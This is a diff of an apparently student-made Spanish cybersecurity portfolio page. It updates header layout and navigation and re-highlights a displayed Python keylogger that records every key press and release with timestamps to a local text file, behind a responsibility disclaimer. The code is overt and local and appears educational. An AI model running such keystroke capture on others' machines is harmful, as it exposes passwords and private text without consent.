@@ -88,6 +88,15 @@
             bottom: -1px; right: -1px;
             border-width: 0 2px 2px 0;
         }
+
+        /* Ocultar barra de desplazamiento en el menú si aparece */
+        .scrollbar-hide::-webkit-scrollbar {
+            display: none;
+        }
+        .scrollbar-hide {
+            -ms-overflow-style: none;
+            scrollbar-width: none;
+        }
     </style>
 </head>
 <body class="font-mono text-gray-300 min-h-screen flex flex-col">
@@ -103,12 +112,13 @@
         <span>REC</span>
     </div>
 
-    <!-- 1. ENCABEZADO -->
+    <!-- 1. ENCABEZADO ACTUALIZADO -->
     <header class="bg-black/95 backdrop-blur-md border-b border-ctosBlue/50 py-3 px-4 md:px-6 sticky top-0 z-50 shadow-[0_4px_20px_rgba(0,168,255,0.15)] w-full overflow-hidden group">
-        <div class="max-w-[1400px] mx-auto flex flex-col xl:flex-row items-center justify-between gap-6">
+        <!-- Ampliamos a 1800px para monitores grandes -->
+        <div class="max-w-[1800px] mx-auto flex flex-col 2xl:flex-row items-center justify-between gap-6">
 
-            <!-- Izquierda: Logo + Identidad + Telemetría -->
-            <div class="flex items-center gap-4 w-full xl:w-auto justify-center xl:justify-start border-b border-white/10 xl:border-none pb-3 xl:pb-0">
+            <!-- Izquierda: Logo + Identidad -->
+            <div class="flex items-center gap-4 w-full 2xl:w-auto justify-center 2xl:justify-start border-b border-white/10 2xl:border-none pb-3 2xl:pb-0">
                 
                 <div class="flex-shrink-0 animate-pulse text-ctosBlue drop-shadow-[0_0_8px_rgba(0,168,255,0.8)] group-hover:drop-shadow-[0_0_15px_rgba(0,168,255,1)] transition-all duration-300">
                     <svg viewBox="0 0 100 100" class="w-10 h-10 md:w-12 md:h-12 fill-current">
@@ -134,21 +144,22 @@
                 </div>
             </div>
 
-            <!-- Derecha: Menú de navegación alineado (Resaltando PARCIAL_1) -->
-            <nav class="flex flex-nowrap items-center justify-center xl:justify-end gap-3 md:gap-4 text-[10px] md:text-xs font-mono uppercase tracking-widest w-full xl:w-auto overflow-x-auto whitespace-nowrap pb-1 xl:pb-0">
-                <a href="index.html" class="text-white hover:text-ctosBlue transition-colors">> INICIO</a>
-                <a href="Parcial1.html" class="text-ctosBlue font-bold drop-shadow-[0_0_5px_rgba(0,168,255,0.8)]">> PARCIAL_1</a>
-                <a href="index.html#parcial2" class="text-gray-600 hover:text-white transition-colors cursor-not-allowed" title="Acceso Denegado">> PARCIAL_2</a>
-                <a href="index.html#parcial3" class="text-gray-600 hover:text-white transition-colors cursor-not-allowed" title="Acceso Denegado">> PARCIAL_3</a>
-                <a href="index.html#certificaciones" class="text-gray-400 hover:text-ctosBlue transition-colors">> CERTIFICACIONES</a>
-                <a href="index.html#contacto" class="text-ctosBlue hover:text-white transition-colors">> CONTACTO</a>
+            <!-- Derecha: Navegación arreglada con justify-start, ml-auto y flex-shrink-0 -->
+            <nav class="flex flex-nowrap items-center justify-start 2xl:ml-auto gap-3 md:gap-5 text-[10px] md:text-xs font-mono uppercase tracking-widest w-full 2xl:w-auto overflow-x-auto whitespace-nowrap pb-1 2xl:pb-0 scrollbar-hide">
+                <a href="index.html" class="text-white hover:text-ctosBlue transition-colors flex-shrink-0">> INICIO</a>
+                <a href="Parcial1.html" class="text-ctosBlue font-bold drop-shadow-[0_0_5px_rgba(0,168,255,0.8)] flex-shrink-0">> PARCIAL_1</a>
+                <a href="#" class="text-gray-600 hover:text-red-500 transition-colors cursor-not-allowed flex-shrink-0" title="Acceso Denegado">> PARCIAL_2</a>
+                <a href="#" class="text-gray-600 hover:text-red-500 transition-colors cursor-not-allowed flex-shrink-0" title="Acceso Denegado">> PARCIAL_3</a>
+                <a href="#" class="text-gray-600 hover:text-red-500 transition-colors cursor-not-allowed flex-shrink-0" title="Pendiente de Carga">> CERTIFICACIONES</a>
+                <a href="Roadtohof.html" class="text-gray-400 hover:text-ctosBlue transition-colors flex-shrink-0">> ROAD_TO_HOF</a>
+                <a href="index.html#contacto" class="text-ctosBlue hover:text-white transition-colors flex-shrink-0">> CONTACTO</a>
             </nav>
             
         </div>
     </header>
 
-    <!-- Contenedor Principal (Dashboard Grid) -->
-    <main class="max-w-6xl w-full mx-auto mt-8 mb-10 p-4 md:p-8 relative z-10 flex-grow">
+    <!-- Contenedor Principal -->
+    <main class="max-w-5xl w-full mx-auto mt-8 mb-10 p-4 md:p-8 relative z-10 flex-grow">
         
         <!-- Botón de regreso -->
         <div class="mb-6">
@@ -256,7 +267,7 @@
             </div>
 
             <!-- CAJA DE ADVERTENCIA (WARNING) TIPO ALERTA DE SISTEMA -->
-            <div class="bg-red-950/40 border border-red-600/50 p-4 shadow-[0_0_15px_rgba(220,38,38,0.2)] relative group">
+            <div class="bg-red-950/40 border border-red-600/50 p-6 pt-10 md:pt-6 relative group">
                 <div class="absolute top-0 right-0 bg-red-600/20 border-l border-b border-red-600/50 px-3 py-1 font-cyber text-[10px] md:text-xs font-bold text-red-500 tracking-widest animate-pulse">
                     SYS_WARNING
                 </div>
@@ -266,7 +277,7 @@
                         [!]
                     </div>
                     <!-- Texto del aviso -->
-                    <div class="pr-20">
+                    <div class="pr-10 md:pr-20">
                         <h4 class="text-red-500 font-cyber font-bold text-lg uppercase tracking-widest mb-1">
                             Aviso de Responsabilidad
                         </h4>
@@ -295,55 +306,57 @@
                     <pre class="text-gray-300 text-sm font-mono leading-relaxed mt-4"><code><span class="text-ctosBlue">import</span> os
 <span class="text-ctosBlue">from</span> pynput.keyboard <span class="text-ctosBlue">import</span> Key, Listener
 <span class="text-ctosBlue">from</span> datetime <span class="text-ctosBlue">import</span> datetime
-# Rutas para el archivo
+
+<span class="text-gray-600"># Rutas para el archivo</span>
 script_dir = os.path.dirname(os.path.abspath(__file__))
-log_filename = os.path.join(script_dir, "registro_teclas.txt")
+log_filename = os.path.join(script_dir, <span class="text-green-400">"registro_teclas.txt"</span>)
 
-def get_formatted_timestamp():
-    """Genera la marca de tiempo en el formato YYYY-MM-DD HH:MM:SS.ms"""
+<span class="text-ctosBlue">def</span> get_formatted_timestamp():
+    <span class="text-gray-500">"""Genera la marca de tiempo en el formato YYYY-MM-DD HH:MM:SS.ms"""</span>
     now = datetime.now()
-    base_time = now.strftime('%Y-%m-%d %H:%M:%S')
+    base_time = now.strftime(<span class="text-green-400">'%Y-%m-%d %H:%M:%S'</span>)
     ms = str(now.microsecond)[:3].zfill(3)
-    return f"{base_time}.{ms}"
+    <span class="text-ctosBlue">return</span> f<span class="text-green-400">"{base_time}.{ms}"</span>
 
-def log_key_event(key_name, event_type):
+<span class="text-ctosBlue">def</span> log_key_event(key_name, event_type):
     timestamp = get_formatted_timestamp()
-    # Construir la línea integrando si es PRESS o RELEASE
-    log_line = f"{timestamp} | {event_type} | {key_name}"    
-    # Imprimir en consola
+    <span class="text-gray-600"># Construir la línea integrando si es PRESS o RELEASE</span>
+    log_line = f<span class="text-green-400">"{timestamp} | {event_type} | {key_name}"</span>    
+    <span class="text-gray-600"># Imprimir en consola</span>
     print(log_line)
-    # Escribir en el archivo añadiendo un salto de línea
-    with open(log_filename, "a", encoding="utf-8") as file:
-        file.write(log_line + "\n")
+    <span class="text-gray-600"># Escribir en el archivo añadiendo un salto de línea</span>
+    <span class="text-ctosBlue">with</span> open(log_filename, <span class="text-green-400">"a"</span>, encoding=<span class="text-green-400">"utf-8"</span>) <span class="text-ctosBlue">as</span> file:
+        file.write(log_line + <span class="text-green-400">"\n"</span>)
 
-#Funcion para detectar si se presiona una tecla
-def on_press(key):
-    try:
+<span class="text-gray-600"># Funcion para detectar si se presiona una tecla</span>
+<span class="text-ctosBlue">def</span> on_press(key):
+    <span class="text-ctosBlue">try</span>:
         key_name = key.char
-    except AttributeError:
-        key_name = str(key).replace('Key.', '')
+    <span class="text-ctosBlue">except</span> AttributeError:
+        key_name = str(key).replace(<span class="text-green-400">'Key.'</span>, <span class="text-green-400">''</span>)
         
-    # Enviamos la etiqueta PRESS
-    log_key_event(key_name, "PRESS")
-#Función para detectar cuando se solto la tecla
-def on_release(key):
-    # Primero procesamos qué tecla se soltó
-    try:
-        key_name = key.char
-    except AttributeError:
-        key_name = str(key).replace('Key.', '')
-        
-    log_key_event(key_name, "RELEASE")
+    <span class="text-gray-600"># Enviamos la etiqueta PRESS</span>
+    log_key_event(key_name, <span class="text-green-400">"PRESS"</span>)
 
-    # Después verificamos si era la tecla para salir
-    if key == Key.esc:
-        print("Saliendo y guardando registro...")
-        return False
+<span class="text-gray-600"># Función para detectar cuando se solto la tecla</span>
+<span class="text-ctosBlue">def</span> on_release(key):
+    <span class="text-gray-600"># Primero procesamos qué tecla se soltó</span>
+    <span class="text-ctosBlue">try</span>:
+        key_name = key.char
+    <span class="text-ctosBlue">except</span> AttributeError:
+        key_name = str(key).replace(<span class="text-green-400">'Key.'</span>, <span class="text-green-400">''</span>)
+        
+    log_key_event(key_name, <span class="text-green-400">"RELEASE"</span>)
+
+    <span class="text-gray-600"># Después verificamos si era la tecla para salir</span>
+    <span class="text-ctosBlue">if</span> key == Key.esc:
+        print(<span class="text-green-400">"Saliendo y guardando registro..."</span>)
+        <span class="text-ctosBlue">return</span> False
     
-print("Escuchando teclas... Presiona ESC para salir.")
+print(<span class="text-green-400">"Escuchando teclas... Presiona ESC para salir."</span>)
 
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
+<span class="text-ctosBlue">with</span> Listener(on_press=on_press, on_release=on_release) <span class="text-ctosBlue">as</span> listener:
+    listener.join()</code></pre>
                 </div>
             </section>
 
